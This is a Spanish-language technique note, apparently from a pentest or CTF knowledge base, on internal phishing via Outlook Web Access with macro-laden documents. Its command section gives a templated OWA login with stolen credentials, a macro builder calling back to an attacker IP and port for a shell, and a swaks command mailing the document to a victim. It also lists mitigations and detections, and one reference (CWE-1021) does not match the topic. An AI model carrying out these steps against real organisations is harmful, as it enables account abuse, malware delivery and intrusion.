---
topic: OWA — phishing interno con macros
tags: [windows, owa, phishing, macro, webshell]
---

# OWA — phishing interno con macros

[🌐 English](owa-macro-phishing.en.md) | **Español**

## Concepto

Outlook Web Access permite enviar correo como un usuario comprometido. Un documento con macros, enviado desde una cuenta interna, tiene más credibilidad y puede ejecutar código cuando la víctima lo abre. La shell resultante se usa para localizar un servidor web con permisos excesivos.

## Cuándo aplica

- Se tienen credenciales válidas de OWA.
- La organización permite adjuntos con macros.
- Hay un usuario que abre documentos internos.

## Procedimiento

1. Acceder a OWA y revisar usuarios y firmas.
2. Crear un documento con una macro que descargue el payload.
3. Enviarlo desde la cuenta comprometida.
4. Esperar la ejecución y obtener la shell.

## Comandos

```bash
# Acceso a OWA
curl -k -c cookies.txt -d "username=<USER>&password=<PASS>" https://<HOST>/owa/auth.owaserver.asp
# Documento con macro
python3 macro_builder.py --lhost <IP> --lport 4444 -o invoice.docm
# Envío
swaks --to <VICTIM> --from <USER> --server <HOST> --attach invoice.docm
```

## Variantes

- Usar un enlace a un documento alojado en un share.
- Aprovechar un formulario o un HTML smuggling.
- Enviar desde una cuenta con mayor confianza.

## Limitaciones

- Las macros pueden estar bloqueadas por política.
- El usuario debe habilitar contenido.
- El correo puede filtrar adjuntos.

## Mitigación

- Bloquear macros de Internet y firmar las permitidas.
- Filtrar adjuntos y educar a los usuarios.
- Aplicar MFA y monitorizar reglas de correo.

## Detección

- Correos internos con `.docm` o `.xlsm`.
- Procesos de Office lanzando PowerShell.
- Reglas de reenvío creadas en OWA.

## Referencias

- [Microsoft — Macros](https://learn.microsoft.com/en-us/office/vba/library-reference/concepts/getting-started-with-vba-in-office)
- [0xdf — Rabbit](https://0xdf.gitlab.io/2022/04/28/htb-rabbit.html)
- [CWE-1021 — Improper Restriction of Rendered UI](https://cwe.mitre.org/data/definitions/1021.html)
